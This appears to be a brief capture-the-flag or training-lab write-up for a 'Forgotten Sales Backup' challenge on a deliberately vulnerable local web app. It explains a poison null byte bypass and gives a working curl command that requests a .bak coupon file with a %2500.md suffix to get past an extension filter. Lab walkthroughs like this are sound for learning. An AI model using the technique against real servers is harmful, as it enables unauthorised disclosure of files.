# Forgotten Sales Backup

In the directory `ftp`, by mean of poison null byte techinique, some sale backup files can be exfiltrated.

`$ curl http://localhost:3000/ftp/coupons_2013.md.bak%2500.md -O`
